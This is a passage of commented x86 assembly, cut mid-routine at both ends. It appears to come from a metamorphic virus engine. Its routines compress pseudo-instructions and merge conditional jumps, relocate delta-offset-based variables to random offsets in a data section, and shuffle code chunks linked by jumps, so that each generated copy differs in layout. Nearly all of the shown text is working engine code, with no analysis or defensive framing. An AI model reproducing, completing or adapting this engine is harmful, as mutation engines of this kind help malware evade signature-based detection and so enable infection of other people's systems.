                neg     eax           ; If it's ADD is because I converted the
                mov     [esi+7], eax  ; SUB as a single instruction before
                jmp   @@Triple_Next00_SetCMP
        @@Triple_Next00_Cont80:
                mov     eax, 48h      ; Set TEST if it's TEST/AND
        @@Triple_Next00_SetInstruction:
                add     eax, ebx
                mov     [esi], al
                mov     eax, 0FFh
                mov     [edx], al
                jmp   @@EndCompressed
        @@Triple_Next00_CMPTESTRegReg:
                mov     eax, [esi]
                and     eax, 78h
                or      eax, eax     ; ADD?
                jz    @@Triple_End   ; If so, finish
                mov     eax, [esi+7]
                mov     [esi+1], al
                mov     eax, [edx+7]
                mov     [esi+7], al
                add     ebx, 1
                jmp   @@Triple_Next00_SET_CMPTEST
        @@Triple_Next00_Constr00:
                mov     eax, [esi]
                cmp     al, 4Ch      ; Common OP?
                ja    @@Triple_Next01
                xor     ebx, ebx
        @@Triple_Next00_Common:
                mov     eax, [esi]
                and     eax, 78h     ; Get instruction
                cmp     eax, 48h     ; If it's not TEST, finish
                jb    @@Triple_Next00_Common_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2       ; Check TEST Reg,Mem
                jz    @@Triple_Next00_Maybe00
                jmp   @@Triple_Next00_Common_01
        @@Triple_Next00_Common_00:
                mov     eax, [esi]
                and     al, 7
                cmp     al, 3        ; Check OP Mem,Reg
                jz    @@Triple_Next00_Maybe00
        @@Triple_Next00_Common_01:
                cmp     al, 4        ; Check OP Mem,Imm
                jnz   @@Triple_End
        @@Triple_Next00_Maybe00:
                mov     eax, [edx+1]       ; Check the Mem operand among the
                cmp     eax, [esi+1]       ; instructions
                jnz   @@Triple_End
                cmp     eax, [edi+1]
                jnz   @@Triple_End
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                mov     eax, [edx+7]
                cmp     al, [edi+7]
                jnz   @@Triple_End
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 48h           ; Get if it's TEST
                jb    @@Triple_Next00_00
                mov     eax, [esi]
                and     eax, 7             ; Check TEST Reg,Mem
                cmp     eax, 2
                jz    @@Triple_Next00_Maybe_OPRegReg ; Jump here if it is
                jmp   @@Triple_Next00_01
        @@Triple_Next00_00:
                mov     eax, [esi]
                and     eax, 7             ; Check OP Mem,Reg
                cmp     eax, 3
                jz    @@Triple_Next00_Maybe_OPRegReg
        @@Triple_Next00_01:
                mov     eax, [edx+7]
                mov     [edx+1], al
                mov     eax, [esi+7]
                mov     [edx+7], eax
                mov     eax, [esi]
                and     eax, 78h
                add     eax, ebx      ; Set the instruction with the EBX
        @@Triple_Next_SetInstruction: ; operands type (Reg,Imm, Reg,Reg, etc.)
                mov     [edx], al
        @@Triple_Next_SetNOP:
                mov     eax, 0FFh
                mov     [esi], al
                mov     [edi], al    ; Eliminate the 2nd and 3rd instruction
                jmp   @@EndCompressed
        @@Triple_Next00_Maybe_OPRegReg:
                mov     eax, [esi+7]
                mov     [edx+1], eax
                mov     eax, [edi+7]
                mov     [edx+7], eax
                mov     eax, [esi]
                and     eax, 0F8h    ; Set CMP/TEST Reg,Reg
                add     eax, 1
                jmp   @@Triple_Next_SetInstruction


      @@Triple_Next01:
                mov     eax, [edx]
                cmp     al, 43h+80h    ; Check the same as above, but this
                jnz   @@Triple_Next02  ; time with 8 bits instructions. Since
                mov     eax, [edx+1]   ; there are many different opcodes,
                cmp     eax, [esi+1]   ; it's not worthy to try to merge it
                jnz   @@Triple_Next02  ; with the routine above, but all the
                mov     eax, [edx+3]   ; others that check the possibility of
                cmp     eax, [esi+3]   ; compression are from there, linking
                jnz   @@Triple_Next02  ; the possibilities with Jccs.
                mov     eax, [edi]
                cmp     al, 42h+80h
                jz    @@Triple_Next01_Constr00
                cmp     al, 70h
                jb    @@Triple_Next02
                cmp     al, 7Fh
                ja    @@Triple_Next02
                mov     eax, [esi]
                and     eax, 0F8h
                cmp     eax, 00h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 28h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 38h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 48h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 20h+80h
                jnz   @@Triple_End
        @@Triple_Next01_Maybe01:
                mov     ebx, 80h
                jmp   @@Triple_Next00_CheckCMPTEST
        @@Triple_Next01_Constr00:
                mov     ebx, 80h
                mov     eax, [esi]
                cmp     al, 4Ch+80h
                ja    @@Triple_Next02     ; Well, at least we achieved to
                cmp     al, 00h+80h       ; use as many instructions from the
                jae   @@Triple_Next00_Common ; @@Triple_Next00 as we can :)


      @@Triple_Next02:
                mov     eax, [edx]
                cmp     al, 4Fh           ; MOV Mem,Mem?
                jnz   @@Triple_Next03
                mov     eax, [edi]
                cmp     al, 70h           ; Jcc in 3rd?
                jb    @@Triple_Next02_ContCheck
                cmp     al, 7Fh
                ja    @@Triple_Next02_ContCheck
                mov     ebx, [edx+7]      ; Get the destiny address and check
                mov     eax, [ebx+1]      ; if first and second instruction
                cmp     eax, [esi+1]      ; use the same operand.
                jnz   @@Triple_End
                mov     eax, [ebx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                mov     eax, [esi]
                and     eax, 78h          ; Check for comparisions:
                cmp     eax, 20h          ; AND?
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 28h          ; SUB?
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 38h          ; CMP?
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 48h          ; TEST?
                jnz   @@Triple_Next03
        @@Triple_Next02_CheckCMPTESTRegMem:
        @@Triple_Next02_CheckCMPTESTMemReg:
                mov     eax, [edx+1]
                mov     [esi+1], eax
                mov     eax, [edx+3]
                mov     [esi+3], eax
                mov     eax, 0FFh
                mov     [edx], eax
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 38h          ; CMP?
                jz    @@EndCompressed
                cmp     eax, 48h          ; TEST?
                jz    @@EndCompressed
                cmp     eax, 20h          ; AND?
                jz    @@Triple_Next02_SetTEST
                mov     ebx, 10h          ; Transform from SUB to CMP
        @@Triple_Next02_ConvertInstruction:
                mov     eax, [esi]        ; Set the instruction
                add     eax, ebx
                mov     [esi], eax
                jmp   @@EndCompressed
        @@Triple_Next02_SetTEST:
                mov     ebx, 28h          ; Transform from AND to TEST
                jmp   @@Triple_Next02_ConvertInstruction
        @@Triple_Next02_ContCheck:
                ;mov     al, [edi]
                cmp     al, 4Fh           ; Check the 3rd instruction for a
                jnz   @@Triple_Next03     ; common operation
                mov     eax, [esi]
                cmp     al, 4Ch           ; Check now the 2nd instruction
                jbe   @@Triple_Next02_CommonOperation
                cmp     al, 00h+80h       ; Check if it's 8 bits instructions
                jb    @@Triple_Next03
                cmp     al, 4Ch+80h
                ja    @@Triple_Next03
        @@Triple_Next02_CommonOperation:
                cmp     eax, 0F6h         ; Check for APICALL_STORE
                jz    @@Triple_Next02_OPMemReg
                and     eax, 78h
                cmp     eax, 48h          ; Check for a common instruction
                jb    @@Triple_Next02_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2            ; Check if it's OP Reg,Mem in 2nd
                jz    @@Triple_Next02_OPMemReg
                jmp   @@Triple_Next02_01
        @@Triple_Next02_00:
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 3            ; Check if it's OP Mem,Reg in 2nd
                jz    @@Triple_Next02_OPMemReg
        @@Triple_Next02_01:
                cmp     eax, 4            ; OP Mem,Imm?
                jnz   @@Triple_End
        @@Triple_Next02_OPMemImm:
        @@Triple_Next02_OPMemReg:
                mov     ebx, [edx+7]
                mov     eax, [ebx+1]
                cmp     eax, [edi+1]      ; Check Mem operands to see if the
                jnz   @@Triple_End        ; instructions use the same one (if
                cmp     eax, [esi+1]      ; not, we can't compress them,
                jnz   @@Triple_End        ; obviously)
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                mov     ebx, [edi+7]
                mov     eax, [ebx+1]
                cmp     eax, [edx+1]
                jnz   @@Triple_End
                mov     eax, [ebx+3]
                cmp     eax, [edx+3]
                jnz   @@Triple_End
                mov     eax, [edx+1]      ; Set the new Mem operand
                mov     [esi+1], eax
                mov     eax, [edx+3]
                mov     [esi+3], eax
        @@Triple_Next_SetNOP_1_3:
                mov     eax, 0FFh
                mov     [edx], al
                mov     [edi], al         ; Overwrite with NOP the first and
                jmp   @@EndCompressed     ; third instruction, since we used
                                          ; the second one to put the new
                                          ; instruction.
      @@Triple_Next03:
                mov     eax, [edx]
                cmp     al, 44h           ; Check for MOV Mem,Imm
                jnz   @@Triple_Next04
                mov     eax, [edi]
                cmp     al, 42h           ; MOV Mem,Imm + xxx + MOV Reg,Mem?
                jz    @@Triple_Next03_Constr00
                cmp     al, 70h           ; Jcc in 3rd?
                jb    @@Triple_Next04
                cmp     al, 7Fh
                ja    @@Triple_Next04
                mov     eax, [esi]
        @@Triple_Next03_Check_CMP_TEST:
                cmp     al, 3Ah           ; CMP Reg,Mem (8 or 32 bits)
                jz    @@Triple_Next03_CMPRegImm
                cmp     al, 4Ah           ; TEST Reg,Mem (" " " ")
                jnz   @@Triple_End
        @@Triple_Next03_CMPRegImm:
        @@Triple_Next03_TESTRegImm:
                mov     eax, [esi]        ; Get 2nd instruction
                and     eax, 0F8h         ; Convert it to OP Reg,Imm
                mov     [edx], al         ; Set it at 1st instruction
                mov     eax, [esi+7]
                mov     [edx+1], al
                mov     eax, 0FFh
                mov     [esi], al
                jmp   @@EndCompressed
        @@Triple_Next03_Constr00:
                mov     eax, [esi]
                cmp     eax, 0F6h         ; Check if it's APICALL_STORE
                jz    @@Triple_Next03_Common_F6
                cmp     al, 4Ch           ; Check if it's a common operation
                ja    @@Triple_Next04
        @@Triple_Next03_Common:
                and     eax, 78h
                cmp     eax, 48h          ; Common operation?
                jb    @@Triple_Next03_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2            ; Check if it's OP Reg,Mem
                jz    @@Triple_Next03_Common_F6
                jmp   @@Triple_End
        @@Triple_Next03_00:
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 3            ; OP Mem,Reg?
                jnz   @@Triple_End
        @@Triple_Next03_Common_F6:
                mov     eax, [edx+1]      ; If the Mem operands are the same,
                cmp     eax, [esi+1]      ; merge them
                jnz   @@Triple_End
                cmp     eax, [edi+1]
                jnz   @@Triple_End
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                mov     eax, [esi+7]
                mov     [edx+1], eax
                mov     eax, [esi]
                and     eax, 0F8h
                jmp   @@Triple_Next_SetInstruction


      @@Triple_Next04:
                mov     eax, [edx]
                cmp     al, 44h+80h    ; Same as above, but 8 bits instructs.
                jnz   @@Triple__Next04
                mov     eax, [edi]
                cmp     al, 42h+80h
                jz    @@Triple_Next04_Constr00
                cmp     al, 70h
                jb    @@Triple__Next04
                cmp     al, 7Fh
                ja    @@Triple__Next04
                mov     eax, [esi]
                sub     al, 80h
                jmp   @@Triple_Next03_Check_CMP_TEST
        @@Triple_Next04_Constr00:
                mov     eax, [esi]
                cmp     al, 00h+80h
                jb    @@Triple__Next04
                cmp     al, 4Ch+80h
                jbe   @@Triple_Next03_Common

      @@Triple__Next04:


      @@Triple_End:
                jmp   @@EndNoCompressed  ; If we didn't found any single,
                                         ; pair or triplet, end with flag of
      @@EndCompressed:                   ; "not found"
                mov     eax, 1
                pop     edi
                ret
      @@EndNoCompressed:
                xor     eax, eax
                pop     edi
                ret
ShrinkThisInstructions endp

;; This routine checks if the pseudoopcode passed uses a memory operand,
;; returning EAX = 1 if uses it, or 0 if it doesn't
CheckIfInstructionUsesMem proc
                cmp     eax, 4Eh  ; Common op?
                jbe   @@Common
                cmp     eax, 4Fh  ; MOV Mem,Mem --> return TRUE
                jz    @@UsesMem
                cmp     eax, 70h  ; If 50/51/58/59 --> return bit 0
                jb    @@CheckLastBit
                cmp     eax, 80h  ; Common 8 bits operations?
                jb    @@NoMem
                cmp     eax, 0CEh
                jbe   @@Common
                cmp     eax, 0E7h ; From E0 to E7 (NOT/NEG) -> return bit 0
                jbe   @@CheckLastBit
                cmp     eax, 0EAh ; CALL Mem?
                jz    @@UsesMem
                cmp     eax, 0EBh ; JMP Mem?
                jz    @@UsesMem
                cmp     eax, 0F1h ; SHIFT Mem?
                jz    @@UsesMem
                cmp     eax, 0F3h ; SHIFT Mem8?
                jz    @@UsesMem
                cmp     eax, 0F6h ; APICALL_STORE?
                jz    @@UsesMem
                cmp     eax, 0F7h
                jz    @@UsesMem
                cmp     eax, 0F8h ; MOVZX Reg,byte ptr [Mem]?
                jz    @@UsesMem
                cmp     eax, 0FCh ; LEA?
                jz    @@UsesMem
       @@NoMem: xor     eax, eax  ; Return FALSE
                ret
       @@CheckLastBit:
                and     eax, 1    ; Return bit 0
                ret
       @@Common:
                cmp     eax, 4Eh  ; Temporal info-transferring opcode
                jz    @@UsesMem
                and     eax, 7
                cmp     eax, 2
                jb    @@NoMem
                cmp     eax, 4    ; OP Reg,Mem / OP Mem,Reg / OP Mem,Imm?
                ja    @@NoMem     ; If not, return FALSE
       @@UsesMem:
                mov     eax, 1
                ret
CheckIfInstructionUsesMem endp

;; This function merges the Imms passed in ECX and EDX depending on the
;; operations passed in EBX and EAX. The return values are the result of
;; merging the operations. For example, if we pass MOV EAX,1234 / ADD EAX,5
;; then the returned operation will be MOV EAX,1239. It's also made for
;; ADD + ADD/SUB and many more. If the operation can't be joined then the
;; return value is 0FEh. If there are no merging, but the first instruction
;; does nothing (for example, ADD EAX,1234 / MOV EAX,5 --> MOV EAX,5) then
;; the return value is NOP.
; In:
;; ECX = First Imm
;; EDX = 2nd Imm
;; EAX = First OP
;; EBX = 2nd OP (in lower 8 bits)
; Out:
;; ECX = Value to OP
;; EAX = OP to perform
;;      FEh if it isn't shrinkable.
;;      FFh if we must eliminate 1st instruction and leave 2nd invariable.
CalculateOperation proc
;; ADC & SBB aren't treated since they aren't used by the engine.
                and     ebx, 0FFh
                and     eax, 0FFh
                cmp     ebx, 40h   ; If 2nd instruction is MOV, eliminate 1st
                jz    @@Eliminate1st
                cmp     eax, 40h   ; First instruction == MOV?
                jz    @@MOV        ; Then, do the merge
                or      eax, eax   ; ADD?
                jz    @@ADD
                cmp     eax, 8     ; OR?
                jz    @@OR
                cmp     eax, 20h   ; AND?
                jz    @@AND
                cmp     eax, 28h   ; SUB?
                jz    @@SUB
                cmp     eax, 30h   ; XOR?
                jz    @@XOR
                cmp     eax, 38h   ; CMP
                jz    @@Eliminate1st
                cmp     eax, 48h   ; TEST
                jnz   @@Eliminate1st
                jmp   @@NoCompression

     ; Check a merging with the ADD as first instruction
     @@ADD:     or      ebx, ebx  ; 2nd instr. ADD?
                jz    @@ADD_ADD   ; Then, merge
                cmp     ebx, 28h  ; 2nd instr. SUB?
                jz    @@ADD_SUB   ; Then, merge
                jmp   @@NoCompression  ; Exit with no compression

     ; Try the merging with OR
     @@OR:      cmp     ebx, 8    ; 2nd instruction == OR?
                jz    @@OR_OR     ; Merge OR / OR
                jmp   @@NoCompression  ; Exit with no compression

     @@AND:     cmp     ebx, 20h  ; Check AND / AND
                jz    @@AND_AND   ; If it is, merge ANDs
                jmp   @@NoCompression  ; Exit with no compression

     @@SUB:     or      ebx, ebx  ; Check SUB / ADD or SUB / SUB
                jz    @@SUB_ADD
                cmp     ebx, 28h
                jnz   @@NoCompression  ; Exit with no compression
     @@SUB_SUB: neg     ecx       ; Merge the SUBs into a single operation:
                sub     ecx, edx  ; -(1st) - 2nd = ADD Imm
                xor     eax, eax
                ret
     @@SUB_ADD: sub     edx, ecx  ; 2nd - 1st = ADD Imm
                mov     ecx, edx
                xor     eax, eax
                ret

     @@XOR:     cmp     ebx, 30h  ; XOR / XOR?
                jz    @@XOR_XOR   ; Then merge XORs
                jmp   @@NoCompression ; If it's not XOR, don't merge

     @@MOV:     or      ebx, ebx  ; MOV / ADD?
                jz    @@MOV_ADD
                cmp     ebx, 8    ; MOV / OR?
                jz    @@MOV_OR
                cmp     ebx, 20h  ; MOV / AND?
                jz    @@MOV_AND
                cmp     ebx, 28h  ; MOV / SUB?
                jz    @@MOV_SUB
                cmp     ebx, 30h  ; MOV / XOR?
                jz    @@MOV_XOR
     @@NoCompression:
                mov     eax, 0FEh ; Set "no compression" return value
                ret
     @@Eliminate1st:
                mov     eax, 0FFh ; Set NOP to first instruction (and leave the
                ret               ; second instruction untouched)

     @@ADD_ADD:
     @@MOV_ADD: add     ecx, edx  ; MOV + ADD or ADD + ADD = Add both Imms
                ret
     @@OR_OR:                     ; MOV + OR or OR + OR = OR both Imms
     @@MOV_OR:  or      ecx, edx
                ret
     @@AND_AND:                   ; MOV + AND or AND + AND = AND both Imms
     @@MOV_AND: and     ecx, edx
                ret
     @@ADD_SUB:                   ; MOV + SUB or ADD + SUB = SUB 2nd Imm from
     @@MOV_SUB: sub     ecx, edx  ; first Imm
                ret
     @@XOR_XOR:                   ; MOV + XOR or XOR + XOR = XOR both Imms
     @@MOV_XOR: xor     ecx, edx
                ret
CalculateOperation endp

;; This function merges two flag checks (like JNZ/JA, for example) to get a
;; direct check to use in a conditional jump.
;; In:
;;  EAX = Flag to check 1
;;  EBX = Flag to check 2
;; Out:
;;  EAX = Direct flag (+70h = 7xh, opcode of Jcc)
;;      = 79h if unconditional jump is performed (+70h = E9h, opcode of JMP)
;;      = 0FFh if no direct flag can be used
;; This function only tests the flags that are coded by this engine (not all
;; the possible types).
;;
;; Checks can be merged as:
;;
;; X(even) + X+1 = JMP(unconditional)
;; NB(3) + E(4) = NB(3)
;; NB(3) + A(7) = NB(3)
;; E(4) + A(7) = NB(3)
;;
;; B(2) + A(7) = NE(5)
;; B(2) + NE(5) = NE (5)
;; NE(5) + A(7) = NE(5)
;;
;; B(2) + E(4) = BE(6)
;; B(2) + BE(6) = BE(6)
;; E(4) + BE(6) = BE(6)
;;
;; NB(3) + BE(6) = JMP(unconditional)
;; NE(5) + BE(6) = JMP (unconditional)


GetRealCheck    proc
                cmp     eax, ebx
                jb    @@1
                mov     ecx, ebx
                mov     edx, eax
                jmp   @@2
        @@1:    mov     ecx, eax
                mov     edx, ebx
        @@2:    test    ecx, 1    ; ECX <= EDX
                jnz   @@NoUnconditional
                sub     edx, 1    ; If Jcc1 == 7x and Jcc2 == 7x+1, it's an
                cmp     ecx, edx  ; unconditional JMP (for example,
                jz    @@UnconditionalJump ; opcodes 74h/75h (JZ/JNZ), etc.
                add     edx, 1
        @@NoUnconditional:
                cmp     ecx, edx  ; If Jcc1 == Jcc2, the result is the same Jcc
                jz    @@ReturnCurrent
                cmp     ecx, 2    ; JB?
                jz    @@Check2_x
                cmp     ecx, 3    ; JAE?
                jz    @@Check3_x
                cmp     ecx, 4    ; JZ?
                jz    @@Check4_x
                cmp     ecx, 5    ; JNZ?
                jnz   @@NoOption
       ;; Check merge with JNZ
       @@Check5_x:
                cmp     edx, 7    ; JNZ + JA?
                jz    @@SetNE     ;   Then, set JNZ
                cmp     edx, 6    ; JNZ + JBE?
                jz    @@UnconditionalJump ; Then, set JMP (unconditional)
                jmp   @@NoOption  ; If there isn't any of these options, it
                                  ; can't be compressed
       ;; Check merge with JB
       @@Check2_x:
                cmp     edx, 4    ; If 2nd < 4, it can't be compressed
                jb    @@NoOption
                cmp     edx, 7    ; If 2nd > 7, it can't be compressed
                ja    @@NoOption
                test    edx, 1    ; JB + JNZ/JA = JNZ
                jnz   @@SetNE
                jmp   @@SetBE     ; JB + JZ/JBE = JBE

       ;; Check merge with JAE
       @@Check3_x:
                cmp     edx, 4    ; JAE + JZ = JAE
                jz    @@SetNB
                cmp     edx, 7    ; JAE + JA = JAE
                jz    @@SetNB
                cmp     edx, 6    ; JAE + JBE = JMP
                jz    @@UnconditionalJump
                jmp   @@NoOption  ; Others can't be compressed

       ;; Check merge with JZ
       @@Check4_x:
                cmp     edx, 6    ; JZ + JBE = JBE
                jz    @@SetBE
                cmp     edx, 7    ; JZ + JA = JAE/JNB
                jnz   @@NoOption
              ;  jmp   @@SetNB

       @@SetNB: mov     eax, 3    ; Set JAE
                ret
       @@SetNE: mov     eax, 5    ; Set JNZ
                ret
       @@SetBE: mov     eax, 6    ; Set JBE
                ret
       @@NoOption:
                mov     eax, 0FFh ; Set "no compression"
       @@ReturnCurrent:
                ret
       @@UnconditionalJump:
                mov     eax, 79h  ; Set JMP
                ret
GetRealCheck    endp
;;
;;
;; End of shrinker
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!VarIdent
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The variable identificator
;; --------------------------
;;
;; Little function that substitutes all the variables referenced along the
;; code by pointers to a table. These pointers will allow later the
;; repositioning of all the variables that are used by the whole code. It's
;; much like the label tables for displacement instructions, but this time
;; for variable referencing.
;;
;; The variables are identified by using the function from the shrinker
;; CheckIfInstructionUsesMem() (which returns EAX true or false) and when
;; the variable only has DeltaRegister as the index.
;;


;;
;; ECX = Delta offset register (must be known)
;; [VariableTable] = Address of buffer to store variables
;; [NumberOfVariables] = Place to store the number of variables
;;
IdentifyVariables proc
                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+VariableTable]
                xor     eax, eax
                mov     [ebp+NumberOfVariables], eax ; Initialization

        @@LoopGetVar:
                xor     eax, eax     ; Get the instruction
                mov     al, [esi]    ; Check if it's LEA
                cmp     eax, 0FCh    ; If it is, don't take it in account
                jz    @@NextInstruction
                call    CheckIfInstructionUsesMem ; Get the usage of Mem by
                                                  ; this instruction.
                or      eax, eax              ; EAX = 0?
                jz    @@NextInstruction       ; Then, it doesn't
                mov     al, [esi+1]           ; Get first index
                cmp     eax, ecx              ; Delta register?
                jz    @@DeltaOffsetAt1        ; If it's, jump
                mov     al, [esi+2]           ; Get the second index
                cmp     eax, ecx              ; Delta register?
                jz    @@DeltaOffsetAt2        ; If it's, jump
        @@NextInstruction:
                add     esi, 10h              ; Next instruction
                cmp     esi, [ebp+AddressOfLastInstruction] ; Last instr.?
                jnz   @@LoopGetVar                          ; If not, jump
                jmp   @@SelectNewVariables   ; Jump to regarble the variables.
        @@DeltaOffsetAt1:
                mov     al, [esi+2]          ; Get the index where the Delta
                jmp   @@Continue_01          ; register wasn't
        @@DeltaOffsetAt2:
                mov     al, [esi+1]
        @@Continue_01:
                cmp     eax, 8               ; Is it another index?
                jnz   @@NextInstruction      ; If it is, don't change it.
                mov     eax, [esi+3]         ; Get addition.
                mov     edx, [ebp+VariableTable]     ; Get the variable table
                mov     ebx, [ebp+NumberOfVariables] ; Get the counter of
                                                     ;  variables.
                sub     eax, [ebp+_DATA_SECTION] ; Get the offset inside the
                and     eax, 0FFFFFFF8h          ; data_section
        @@LookForVariable:
                or      ebx, ebx           ; If we haven't found the variable
                jz    @@InsertVariable     ; already inserted, insert it
                cmp     eax, [edx]         ; Check if it exists
                jz    @@VariableExists     ; If exists, jump
                add     edx, 4             ; Check next variable
                sub     ebx, 4
                jmp   @@LookForVariable
       @@InsertVariable:                   ; Insert the variable in the table
                mov     [edx], eax         ; and use EDX as the new variable
                mov     eax, [ebp+NumberOfVariables]  ; entry
                add     eax, 4
                mov     [ebp+NumberOfVariables], eax
       @@VariableExists:
                mov     eax, 00000809h  ; Set the index 9, which means
                mov     [esi+1], eax    ;  "variable identifier".
                mov     [esi+3], edx    ; Variable address at table
                jmp   @@NextInstruction

       @@SelectNewVariables:
                mov     ecx, 20000h / 4    ; Initialize the table of marks
                mov     edi, [ebp+VarMarksTable] ; for variables. This helps
                xor     eax, eax                 ; us to select new variables.
       @@LoopInitializeMarks:
                mov     [edi], eax      ; Initialize with 0s all the table
                add     edi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopInitializeMarks

;; Now what we are going to do is to get all the variables from the variable
;; table and select a new offset inside the DATA_SECTION for every one. In
;; this way the variables never point to the same place nor have a proportion
;; between them.
                mov     ecx, [ebp+NumberOfVariables] ; Get the table in EBX,
                mov     ebx, [ebp+VariableTable]     ; ECX = number of entries
           @@LoopGetNewVar:
                call    Random           ; Select a new position
                and     eax, 01FFF8h
                add     eax, [ebp+VarMarksTable] ; Get the mark of the var.

                mov     edx, [eax]       ; Is that address already reserved?
                or      edx, edx
                jnz   @@LoopGetNewVar    ; If it is, select another one

                mov     edx, 1           ; Reserve that variable to avoid the
                mov     [eax], edx       ; reselection of the offset
                sub     eax, [ebp+VarMarksTable]
                push    ebx              ; Get the offset inside DATA_SECTION
                mov     ebx, eax
                call    Random           ; Add a random from 0 to 3
                and     eax, 3
                add     eax, ebx
                pop     ebx
                mov     [ebx], eax    ; Set the new address of the variable
                add     ebx, 4
                sub     ecx, 4        ; Next variable
                or      ecx, ecx      ; Have we reached the end?
                jnz   @@LoopGetNewVar ; If not, loop again

                ret                   ; Return
IdentifyVariables endp
;;
;;
;; End of variable identificator
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!Permutator
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The permutator
;;---------------
;;
;; The code here will divide in chunks of code all the disassembled made
;; before, and then linked with jumps. All the labels are also fixed, so
;; the returned permutation could be reassembled without problems.
;;
;; First, the table is generated, then shuffled and after that used to copy
;; the instructions in the order the table says. The table will be generated
;; taking the first instruction address as the beginning of the frame
;; generator, and then creating pairs of "beginnings" and "ends" of portions,
;; for example: x000-x020h, x020h-x070h, x070h-x140h, etc.
;;
;; We keep in every shuffle loop the situation of the first chunk of code,
;; since it's the entrypoint. Moreover, when making the portions we scan for
;; some specific instructions that it's better to not fragment (for example,
;; CALL [API_Address] and APICALL_STORE).
;;
PermutateCode   proc
                xor     eax, eax
                mov     [ebp+NumberOfJumps], eax  ; Initialize this
                mov     edi, [ebp+FramesTable]
                mov     ecx, [ebp+AddressOfLastInstruction]
                mov     eax, [ebp+InstructionTable]
                mov     esi, eax
                sub     ecx, eax ; Number of instructions * 10h

       @@NextFrame:
                call    Random     ; Get a random number between F0h and 1E0h
                and     eax, 0F0h
                add     eax, 0F0h
                mov     [edi], esi ; Set the beginning of the first frame
                add     esi, eax
                mov     [edi+4], esi ; Set the end as beginning+the random
                mov     ebx, esi
    @@LoopCheckInst00:
                sub     ebx, 10h    ; Get the last instruction
                cmp     ebx, [edi]  ; If we meet the first instruction, stop
                jz    @@CheckInst_Next00
                mov     edx, [ebx]  ; Get the pseudoopcode
                and     edx, 0FFh
                cmp     edx, 0FFh         ; Is it NOP?
                jz    @@LoopCheckInst00   ; Then decrease again (ignore it)
                cmp     edx, 0EAh         ; API CALL?
                jnz   @@CheckInst_Next00  ; If not, finish
    @@LoopCheckInst01:
                add     ebx, 10h          ; Get the next address
                cmp     ebx, [ebp+AddressOfLastInstruction] ; If it's the last
                jz    @@CheckInst_Next00                 ; instruction, finish
                mov     edx, [ebx]        ; Get the opcopde
                and     edx, 0FFh
                cmp     edx, 0FFh         ; NOP?
                jz    @@LoopCheckInst01   ; If NOP, loop again
                cmp     edx, 0F6h         ; Check for APICALL_STORE
                jnz   @@CheckInst_Next00  ; If it isn't, continue
                add     ebx, 10h          ; Include APICALL_STORE in the frame
                sub     ebx, esi
                add     eax, ebx
                add     esi, ebx
                mov     [edi+4], esi
    @@CheckInst_Next00:
                mov     ebx, esi          ; Get the address of the last
                jmp   @@DontAdd10hYet     ; instruction of the frame and jump
    @@LoopCheckInst02:
                add     ebx, 10h          ; Next instruction
    @@DontAdd10hYet:
                cmp     ebx, [ebp+AddressOfLastInstruction] ; If it's the last
                jz    @@CheckInst_Next01           ; instruction, finish loop
                mov     edx, [ebx]
                and     edx, 0FFh
                cmp     edx, 0FFh         ; NOP?
                jz    @@LoopCheckInst02   ; If NOP, get the next instruction
                cmp     edx, 0E9h         ; JMP?
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0FEh         ; RET?
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0EBh         ; JMP Mem?
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 0EDh         ; JMP Reg?
                jz    @@CheckInst_IncludeInstruction
                cmp     edx, 70h          ; Jcc?
                jb    @@CheckInst_Next01
                cmp     edx, 7Fh
                ja    @@CheckInst_Next01

  ;; Include the next instructions in the same frame:
  ;; JMP: Include it to avoid strange situations where Jcc + JMP cannot be
  ;;     compressed and then never eliminated (or something like that)
  ;;     (3D problems :)
  ;; RET: The same: we avoid situations where a single RET is pointed by a
  ;;     jump.
  ;; JMP Mem: Same as RET.
  ;; JMP Reg: Same as RET.
  ;; Jcc: To avoid unlinking it from its CMP/TEST from before, and then making
  ;;     the shrinker to eliminate a single CMP/TEST.

    @@CheckInst_IncludeInstruction:
                add     ebx, 10h  ; Add instructions to the frame until all
